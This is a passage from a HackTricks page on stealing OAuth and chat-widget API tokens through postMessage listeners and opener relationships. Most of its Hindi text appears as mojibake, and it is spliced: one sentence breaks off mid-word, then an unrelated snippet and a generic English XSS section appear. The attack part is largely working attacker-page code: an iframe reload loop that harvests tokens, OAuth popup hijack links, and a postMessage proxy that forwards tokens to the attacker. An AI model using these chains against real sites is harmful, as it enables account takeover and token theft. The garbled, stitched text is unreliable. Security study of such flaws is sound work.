рдЬрд┐рд╕рд╕реЗ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рд╕рд╣реА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдмрд╛рдЗрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

## **рдЧреИрдЬреЗрдЯ 3: рдЙрджрд╛рд╣рд░рдг 3, рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ API**

рдЕрдВрддрд┐рдо рдЙрджрд╛рд╣рд░рдг рдПрдХ рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдерд╛ рдЬреЛ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рд╕рднреА рдкреЗрдЬреЛрдВ рдкрд░ рдореМрдЬреВрдж рдерд╛, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рддреНрд░реБрдЯрд┐ рдкреЗрдЬреЛрдВ рдкрд░ рднреАред рдЗрд╕рдореЗрдВ рдХрдИ postMessage-рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрддреЗ рдереЗ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдПрдХ рдареАрдХ рдореВрд▓ рд╕реНрд░реЛрдд рдХреА рдЬрд╛рдВрдЪ рдХреЗ рдмрд┐рдирд╛ рдерд╛ рдЬреЛ рдХреЗрд╡рд▓ рдЖрдкрдХреЛ рдЪреИрдЯ-рдкреЙрдкрдЕрдк рд╢реБрд░реВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ред рджреВрд╕рд░реЗ рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рдХреЗ рдкрд╛рд╕ рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ рдХреЛ рдПрдХ рдкреНрд░рд╛рд░рдВрднреАрдХрд░рдг-рдХреЙрд▓ рдФрд░ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЪреИрдЯ-API-рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдЦреНрдд рдореВрд▓ рд╕реНрд░реЛрдд рдХреА рдЬрд╛рдВрдЪ рдереАред
```html
<iframe src="https://chat-widget.example.com/chat"></iframe>
<script>
window.addEventListener('message', function(e) {
if (e.data.type === 'launch-chat') {
openChat();
}
});

function openChat() {
...
}

var chatApiToken;
window.addEventListener('message', function(e) {
if (e.origin === 'https://chat-widget.example.com') {
if (e.data.type === 'chat-widget') {
if (e.data.key === 'api-token') {
chatApiToken = e.data.value;
}
if(e.data.key === 'init') {
chatIsLoaded();
}
}
}
});

function chatIsLoaded() {
...
}
</script>
```
рдЬрдм рдЪреИрдЯ-рдЖрдЗрдлреНрд░реЗрдо рд▓реЛрдб рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ:

1. рдпрджрд┐ рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ рдХреЗ localStorage рдореЗрдВ рдПрдХ рдЪреИрдЯ-api-рдЯреЛрдХрди рдореМрдЬреВрдж рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрдкрдиреЗ рдкреИрд░реЗрдВрдЯ рдХреЛ postMessage рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдкреАрдЖрдИ-рдЯреЛрдХрди рднреЗрдЬреЗрдЧрд╛ред рдпрджрд┐ рдХреЛрдИ рдЪреИрдЯ-api-рдЯреЛрдХрди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХреБрдЫ рдирд╣реАрдВ рднреЗрдЬреЗрдЧрд╛ред
2. рдЬрдм рдЖрдЗрдлреНрд░реЗрдо рд▓реЛрдб рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрдкрдиреЗ рдкреИрд░реЗрдВрдЯ рдХреЛ `{"type": "chat-widget", "key": "init"}` рдХреЗ рд╕рд╛рде postMessage рднреЗрдЬреЗрдЧрд╛ред

рдпрджрд┐ рдЖрдк рдореБрдЦреНрдп рд╡рд┐рдВрдбреЛ рдореЗрдВ рдЪреИрдЯ-рдЖрдЗрдХрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддреЗ рд╣реИрдВ:

1. рдпрджрд┐ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдХреЛрдИ рдЪреИрдЯ-api-рдЯреЛрдХрди рднреЗрдЬрд╛ рдирд╣реАрдВ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ рдПрдХ рдЯреЛрдХрди рдмрдирд╛рдПрдЧрд╛ рдФрд░ рдЗрд╕реЗ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдореВрд▓ рдХреЗ localStorage рдореЗрдВ рд░рдЦреЗрдЧрд╛ рдФрд░ рдЗрд╕реЗ рдкреЛрд╕реНрдЯрдореИрд╕реЗрдЬ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреИрд░реЗрдВрдЯ рд╡рд┐рдВрдбреЛ рдХреЛ рднреЗрдЬреЗрдЧрд╛ред
2. рдЗрд╕рдХреЗ рдмрд╛рдж рдкреИрд░реЗрдВрдЯ рд╡рд┐рдВрдбреЛ рдЪреИрдЯ-рд╕реЗрд╡рд╛ рдХреЛ API-рдХреЙрд▓ рдХрд░реЗрдЧрд╛ред рдПрдкреАрдЖрдИ-рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рд╕реАрдУрдЖрд░рдПрд╕-рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИред рдЖрдкрдХреЛ рдПрдХ рдорд╛рдиреНрдп `Origin`-рд╣реИрдбрд░ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдЪреИрдЯ-api-рдЯреЛрдХрди рдХреЗ рд╕рд╛рде API-рдХреЙрд▓ рдХреЛ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХреЛ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред
3. рдореБрдЦреНрдп рд╡рд┐рдВрдбреЛ рд╕реЗ рдПрдкреАрдЖрдИ-рдХреЙрд▓ рдореЗрдВ `location.href` рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛ рдФрд░ рдЗрд╕реЗ рдЪреИрдЯ-api-рдЯреЛрдХрди рдХреЗ рд╕рд╛рде "рд╡рд░реНрддрдорд╛рди рдкреГрд╖реНрда" рдХреЗ рд░реВрдк рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдХрд░реЗрдЧрд╛ред рдЙрддреНрддрд░ рдореЗрдВ рдПрдХ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рд╣реЛрдВрдЧреЗ рдЬреЛ рдЪреИрдЯ-рд╕рддреНрд░ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрдВрдЧреЗ:

```json
{
"api_data": {
"current_page": "https://example.com/#access_token=test",
"socket_key": "xxxyyyzzz",
...
}
}
```

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдореИрдВрдиреЗ рдпрд╣ рдЬрд╛рди рд▓рд┐рдпрд╛ рдХрд┐ рдЪреИрдЯ-api-рдЯреЛрдХрди рдХреА рдШреЛрд╖рдгрд╛ рд╣рдореЗрд╢рд╛ рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рдкреИрд░реЗрдВрдЯ рдХреЛ рдХреА рдЬрд╛рдПрдЧреА, рдФрд░ рдЕрдЧрд░ рдореБрдЭреЗ рдЪреИрдЯ-api-рдЯреЛрдХрди рдорд┐рд▓ рдЧрдпрд╛ рд╣реИ рддреЛ рдореИрдВ рд╕рд┐рд░реНрдл рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реВрдВ рдФрд░ рдлрд┐рд░ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдХреГрддреНрд░рд┐рдо `Origin`-рд╣реИрдбрд░ рдХреЛ рдПрдкреАрдЖрдИ-рдХреЙрд▓ рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реВрдВ рдХреНрдпреЛрдВрдХрд┐ рд╕реАрдУрдЖрд░рдПрд╕-рд╣реИрдбрд░ рдХреЗрд╡рд▓ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рд▓рд┐рдП рдорд╛рдпрдиреЗ рд░рдЦрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢реНрд░реГрдВрдЦрд▓рд╛ рдкреНрд░рд╛рдкреНрдд рд╣реБрдИ:

1. рдПрдХ рджреБрд╖реНрдЯ рдкреГрд╖реНрда рдмрдирд╛рдпрд╛ рдЬреЛ рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ рдХрд╛ рдПрдХ рдЖрдЗрдлреНрд░реЗрдо рдПрдореНрдмреЗрдб рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЪреИрдЯ-api-рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП postMessage-рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рдЬреЛрдбрд╝рд╛ред рд╕рд╛рде рд╣реА, рдпрджрд┐ рдореИрдВрдиреЗ 2 рд╕реЗрдХрдВрдб рдореЗрдВ рдЪреИрдЯ-api-рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реИ рддреЛ рдЖрдЗрдлреНрд░реЗрдо рдХреЛ рд░реАрд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдШрдЯрдирд╛ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ред рдпрд╣ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдерд╛ рдХрд┐ рдореИрдВ рдЙрди рдкреАрдбрд╝рд┐рддреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рднреА рдХрд░рддрд╛ рд╣реВрдВ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдХрднреА рдЪреИрдЯ рдкреНрд░рд╛рд░рдВрдн рдирд╣реАрдВ рдХрд┐рдпрд╛ рдерд╛, рдФрд░ рдХреНрдпреЛрдВрдХрд┐ рдореИрдВ рджреВрд░рд╕реНрде рд╕реЗ рдЪреИрдЯ рдЦреЛрд▓рдиреЗ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рдерд╛, рдореБрдЭреЗ рдкрд╣рд▓реЗ рдЪреИрдЯ-api-рдЯреЛрдХрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА рддрд╛рдХрд┐ рдореИрдВ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд╕реЗ рдЪреИрдЯ-рдПрдкреАрдЖрдИ рдореЗрдВ рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдкреЛрд▓рд┐рдВрдЧ рд╢реБрд░реВ рдХрд░ рд╕рдХреВрдВред

```html
<div id="leak"><iframe
id="i" name="i"
src="https://chat-widget.example.com/chat" onload="reloadToCheck()"></iframe></div>
<script>
var gotToken = false;
function reloadToCheck() {
if (gotToken) return;
setTimeout(function() {
document.getElementById('i').src = 'https://chat-widget.example.com/chat?' + Math.random();
}, 2000);
}
window.onmessage = function(e) {
if (e.data.key === 'api-token') {
gotToken = true;
lookInApi(e.data.value);
}
}
launchChatWindowByPostMessage();
</script>
```
2. рджреБрд╖реНрдЯ рдкреГрд╖реНрда рдкрд░ рдПрдХ рд▓рд┐рдВрдХ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдЯреЛрдХрди рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд╛рдЗрди-рдЗрди-рдлреНрд▓реЛ рдХреЛ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрдЧрд╛ рдФрд░ рдпрд╣ рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ рдХреЗ рд╕рд╛рде URL рдореЗрдВ рдЯреЛрдХрди рдХреЗ рд╕рд╛рде рдЕрдВрдд рдореЗрдВ рдЦрддреНрдо рд╣реЛрдЧрд╛:

```
<a href="#" onclick="b=window.open('https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...');">рдпрд╣рд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдЯреЛрдХрди рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП</a>
```
3. `launchChatWindowByPostMessage()`-рдлрд╝рдВрдХреНрд╢рди рдирд┐рд░рдВрддрд░рддрд╛ рд╕реЗ рдореБрдЦреНрдп рд╡рд┐рдВрдбреЛ рдХреЛ postMessage рднреЗрдЬреЗрдЧрд╛, рдпрджрд┐ рдЦреЛрд▓реА рдЧрдИ рд╣реЛ, рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

```javascript
function launchChatWindowByPostMessage() {
var launch = setInterval(function() {
if(b) { b.postMessage({type: 'launch-chat'}, '*'); }
}, 500);
}
```
4. рдЬрдм рдкреАрдбрд╝рд┐рдд рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ рдФрд░ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдкрд░ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ, рддреЛ рдЪреИрдЯ рд▓реЙрдиреНрдЪ рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЪреИрдЯ-api-рдЯреЛрдХрди рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдореЗрд░реЗ рджреБрд╖реНрдЯ рдкреГрд╖реНрда рдкрд░ рдЪреИрдЯ-рд╡рд┐рдЬреЗрдЯ рдЖрдЗрдлреНрд░реЗрдо рдХрд╛ рд░реАрд▓реЛрдб рдЪреИрдЯ-api-
```html
<a href="#" onclick="a=window.open('attacker2.html'); return false;">Accept cookies</a>
```
## XSS and Iframes to Leak Code and State Values

### XSS (Cross-Site Scripting)

XSS is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can be used to steal sensitive information, such as session cookies or login credentials.

To exploit XSS, the attacker needs to find a vulnerable input field or parameter that doesn't properly sanitize user input. Once the vulnerability is identified, the attacker can inject a script that will be executed by the victim's browser.

One common technique is to inject a script that steals the victim's session cookie and sends it to the attacker's server. This allows the attacker to impersonate the victim and perform actions on their behalf.

### Iframes and Post Messages

Another technique to exploit XSS is by using iframes and post messages. An iframe is an HTML element that allows embedding another HTML document within the current page. By injecting an iframe with a malicious script, the attacker can execute arbitrary code within the victim's browser.

Post messages are a way for different windows or iframes to communicate with each other. By using post messages, the attacker can send data from the malicious iframe to the parent window or vice versa.

To exploit XSS using iframes and post messages, the attacker needs to find a vulnerable page that allows embedding iframes and doesn't properly validate or sanitize the data received through post messages. By injecting a malicious iframe and using post messages, the attacker can leak code and state values from the victim's browser.

### Conclusion

XSS vulnerabilities can have serious consequences, as they allow attackers to steal sensitive information and perform actions on behalf of the victim. It is important for developers to properly sanitize user input and validate data received through post messages to prevent XSS attacks.
```html
<a href="#" onclick="b=window.open('https://accounts.google.com/oauth/...?', '', 'x'); location.href = 'https://example.com/postmessage-proxy'; return false;">Login to google</a>
```
рдФрд░ `https://example.com/postmessage-proxy` рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рд╣реЛрдЧрд╛:
```javascript
// Proxy all my messages to my opener:
window.onmessage=function(e) { opener.postMessage(e.data, '*'); }
```
рдореИрдВ `web_message`-рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЛрдб рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдПрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ рддрд╛рдХрд┐ OAuth-рдкреНрд░рджрд╛рддрд╛ рд╕реЗ рдЯреЛрдХрди рдХреЛ `https://example.com` рдХреЗ рдорд╛рдиреНрдп рдореВрд▓ рдХреЛ рднреЗрдЬ рд╕рдХреВрдБ, рд▓реЗрдХрд┐рди рдЗрдВрдбрдкреЙрдЗрдВрдЯ рдЯреЛрдХрди рдХреЛ рдЖрдЧреЗ `рдУрдкрдирд░` рдХреЛ рднреЗрдЬреЗрдЧрд╛ рдЬреЛ рд╣рдорд▓рд╛рд╡рд╛рд░реА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреА рдкреЗрдЬ рд╣реЛрддреА рд╣реИред

рдпрд╣ рдлреНрд▓реЛ рдЕрд╕рдВрднрд╛рд╡рд┐рдд рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХреЗ рд▓рд┐рдП рджреЛ рдХреНрд▓рд┐рдХ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ: рдкрд╣рд▓рд╛, рд╣рдорд▓рд╛рд╡рд╛рд░реА рдФрд░ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рдмреАрдЪ рдПрдХ рдУрдкрдирд░-рд╕рдВрдмрдВрдз рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдФрд░ рджреВрд╕рд░рд╛, OAuth-рдлреНрд▓реЛ рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рдореЗрдВ рд▓реАрдЬрд┐рдЯ рд╡реЗрдмрд╕рд╛рдЗрдЯ OAuth-рдкреЙрдкрдЕрдк рдХреЗ рдУрдкрдирд░ рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрддреА рд╣реИред

OAuth-рдкреНрд░рджрд╛рддрд╛ рдЯреЛрдХрди рдХреЛ рд▓реАрдЬрд┐рдЯ рдореВрд▓ рдХреЗ рдкрд╛рд╕ рднреЗрдЬрддрд╛ рд╣реИ:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example1.png)

рдФрд░ рд▓реАрдЬрд┐рдЯ рдореВрд▓ рдХреЗ рдкрд╛рд╕ postMessage-рдкреНрд░реЙрдХреНрд╕реА рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЗрд╕рдХреЗ рдУрдкрдирд░ рдХреЛ рднреЗрдЬрддрд╛ рд╣реИ:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example2.png)

рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд╛рд░реА рдХреЛ рдЯреЛрдХрди рдорд┐рд▓рддрд╛ рд╣реИ:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example3.png)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks** рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
